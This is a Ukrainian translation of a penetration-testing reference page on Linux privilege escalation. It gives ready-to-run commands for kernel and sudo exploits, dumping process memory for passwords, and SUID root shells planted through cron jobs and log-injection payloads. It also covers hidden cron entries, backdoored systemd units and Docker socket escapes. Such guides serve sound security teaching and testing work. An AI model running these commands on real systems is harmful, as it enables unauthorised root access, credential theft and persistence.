# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Якщо ви **маєте права запису в будь-яку папку, що входить до змінної `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про оточення

Цікава інформація, паролі або API-ключі в змінних оточення?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і наявність exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії kernel з того веб-сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити на victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel згадується в якомусь exploit — тоді ви будете впевнені, що цей exploit дійсний.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використавши цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють неповноважним локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, коли файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском exploit-а переконайтеся, що ваша версія `sudo` вразлива та підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Перегляньте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати escape з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **what is mounted and unmounted**, де і чому. Якщо щось unmounted, ви можете спробувати mount it і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічити корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендовано вручну перевірити версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Зверніть увагу, що ці команди виведуть багато інформації, яка в більшості випадків буде марною, тому рекомендується використовувати програми на кшталт OpenVAS або подібні, які перевіряють, чи якась встановлена версія ПЗ вразлива до відомих exploits_

## Процеси

Погляньте на **які процеси** виконуються та перевірте, чи якийсь процес має **більше привілеїв, ніж повинен** (можливо, tomcat виконується від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Деякі сервіси сервера зберігають **credentials у відкритому тексті в пам'яті**.\
Зазвичай вам потрібні **root привілеї**, щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти додаткові credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Зауважте, що сьогодні більшість машин **не дозволяють ptrace за замовчуванням**, що означає, що ви не зможете дампити інші процеси, які належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також вони показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** і їхні зсуви. Ми використовуємо цю інформацію, щоб **seek у файлі mem і dump усіх областей, доступних для читання** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна звертатися за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише для **root** та групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump — це для Linux переосмислення класичного інструменту ProcDump із набору інструментів Sysinternals для Windows. Отримати можна тут: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб здампити пам'ять процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимогу root і здампити процес, що належить вам
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні секції, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Для коректної роботи вимагає привілеїв root.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані завдання/Cron jobs

### Crontab UI (alseambusher) запущений як root — web-based scheduler privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) працює від імені root і прив'язана лише до loopback, її все одно можна дістатися через SSH local port-forwarding і створити привілейоване завдання для підвищення привілеїв.

Типовий ланцюг
- Знайти порт, доступний лише на loopback (e.g., 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Зміцнення безпеки
- Не запускайте Crontab UI від імені root; обмежте його спеціальним користувачем з мінімальними правами
- Прив'язуйте до localhost та додатково обмежуйте доступ через firewall/VPN; не використовуйте паролі повторно
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або EnvironmentFile, доступний лише для root
- Увімкніть audit/logging для виконань задач за запитом

Перевірте, чи якась запланована задача вразлива. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? можна змінити файли, які використовує root? використати symlinks? створити спеціальні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях cron

Наприклад, у файлі _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати якусь команду або скрипт, не встановивши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт, що виконується від імені root, має “**\***” всередині команди, це можна використати, щоб спричинити небажані наслідки (наприклад, privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, наприклад** _**/some/path/\***_ **, то він не є вразливим (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для додаткових wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion та command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає ненадійні поля журналу і передає їх у arithmetic context, зловмисник може інжектнути command substitution $(...) що виконається як root, коли cron запуститься.

- Чому це працює: У Bash розширення відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting та pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконується команда), а залишкова числова `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Типовий вразливий паттерн:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Домогіться запису в лог тексту, контрольованого зловмисником, так щоб поле, що виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не виводить у stdout (або перенаправте її), щоб arithmetic залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script** який виконується від імені root, ви дуже просто можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується від імені root, використовує **directory, до якої ви маєте повний доступ**, можливо, варто видалити цю folder і **створити symlink folder на іншу**, що слугуватиме для виконання script під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Користувацьки підписані cron-бінарні файли з записуваними payloads
Blue teams іноді "sign" cron-запущені бінарні файли, роблячи дамп кастомного ELF-розділу і виконуючи grep по рядку vendor перед запуском їх від root. Якщо цей бінарник має груповий запис (наприклад, `/opt/AV/periodic-checks/monitor`, який належить `root:devs 770`) і ви можете leak матеріали для підпису, ви можете підробити розділ і перехопити cron-завдання:

1. Використайте `pspy`, щоб зафіксувати потік валідації. В прикладі Era, root запускав `objcopy --dump-section .text_sig=text_sig_section.bin monitor` далі `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і потім виконував файл.
2. Відтворіть очікуваний сертифікат, використовуючи злитий ключ/конфіг (з `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Побудуйте шкідливу заміну (наприклад, поставте SUID bash, додайте свій SSH ключ) і вбудуйте сертифікат у `.text_sig`, щоб grep проходив:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований бінарник, зберігаючи біти виконання:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного запуску cron; як тільки наївна перевірка підпису пройде, ваш payload виконається від root.

### Часті cron-завдання

Можна моніторити процеси, щоб знайти ті, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і ескалювати привілеї.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** і видаляти команди, що виконувалися найбільше, можна зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно буде моніторити та перелічувати кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Записувані _.service_ файли

Перевірте, чи можете записати будь-який файл `.service`. Якщо так, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться зачекати до перезавантаження машини).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Записувані бінарні файли сервісів

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються сервісами**, ви можете змінити їх на backdoors, тож коли сервіси будуть повторно виконані, backdoors також виконаються.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку папку в цьому шляху, ви, можливо, зможете **escalate privileges**. Потрібно шукати **відносні шляхи, що використовуються в конфігураційних файлах сервісів**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим же ім'ям, що й бінарний файл за відносним шляхом** у папці PATH systemd, у яку ви маєте право запису, і коли сервіс буде змушений виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти сервіси, але перевірте, чи можете скористатися `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** — це unit-файли systemd, назви яких закінчуються на `**.timer**`, що керують `**.service**` файлами або подіями. **Timers** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних часових подій і можуть запускатися асинхронно.

Можна перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> unit, який має бути активований, коли спливає цей таймер. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням вказує на service з таким самим ім'ям, що і timer unit, за винятком суфікса. (Див. вище.) Рекомендується, щоб ім'я unit, який активується, і ім'я timer unit були названі ідентично, за винятком суфікса.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права запису** у **systemd PATH** (щоб видавати себе за цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, вам потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **timer** **активується** шляхом створення символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **зв'язок між процесами** на тій самій або на різних машинах у моделях клієнт‑сервер. Вони використовують стандартні Unix дескрипторні файли для міжмашинної комунікації і налаштовуються через `.socket` файли.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Усередині цього файлу можна налаштувати декілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різняться, але загалом використовуються для **вказання, де буде відбуватися прослуховування** сокета (шлях до AF_UNIX socket файлу, IPv4/6 і/або порт для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється **екземпляр service**, і йому передається лише сокет з'єднання. Якщо **false**, всі listening sockets передаються **запущеній service unit**, і створюється лише одна service unit для всіх з'єднань. Це значення ігнорується для datagram sockets і FIFO, де один сервіс обробляє весь вхідний трафік без умов. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони у спосіб, сумісний з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або більше рядків команд, які **виконуються до** або **після** створення і прив'язування listening **sockets**/FIFOs відповідно. Перший токен рядка команди має бути абсолютним іменем файлу, після якого йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття і видалення listening **sockets**/FIFOs відповідно.
- `Service`: Визначає ім'я unit **service**, яке треба **активувати** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з Accept=no. За замовчуванням використовується сервіс з тим самим іменем, що й сокет (із заміненим суфіксом). У більшості випадків використання цієї опції не потрібне.

### Файли `.socket`, доступні для запису

Якщо ви знайдете **файловий `.socket`**, доступний для запису, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано до створення сокета. Тому, **ймовірно доведеться почекати перезавантаження машини.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Сокети, доступні для запису

Якщо ви **виявите будь‑який записуваний сокет** (_тут йдеться саме про Unix Sockets, а не про конфігураційні `.socket` файли_), то **ви зможете взаємодіяти** з цим сокетом і, можливо, експлуатувати вразливість.

### Перелічення Unix сокетів
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets, що слухають HTTP** запити (_я не говорю про .socket файли, а про файли, які виконують роль unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете з ним **взаємодіяти** і, можливо, **експлуатувати якусь вразливість**.

### Docker сокет, доступний для запису

Docker сокет, який часто знаходиться за адресою `/var/run/docker.sock`, — критичний файл, який потрібно захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Наявність доступу на запис до цього сокета може призвести до підвищення привілеїв. Нижче наведено розбір того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є доступ на запис до Docker сокета, ви можете підвищити привілеї за допомогою наступних команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом рівня root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

Якщо Docker CLI недоступний, docker socket все ще можна керувати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневий каталог хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволяє виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення `socat`-з'єднання ви можете виконувати команди безпосередньо в контейнері з доступом рівня root до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права на запис до docker socket, оскільки ви **в групі `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **більше способів вийти з docker або зловживати ним, щоб escalate privileges** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, прочитайте наступну сторінку — **ви можете зловживати нею, щоб escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку — **ви можете зловживати нею, щоб escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система **inter-Process Communication (IPC)**, яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійну основу для різних форм взаємодії між додатками.

Система є універсальною, підтримуючи базові IPC, що покращують обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth-демона про вхідний дзвінок може змусити програвач музики вимкнути звук, покращуючи досвід користувача. Додатково D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між застосунками, оптимізуючи процеси, які раніше були складними.

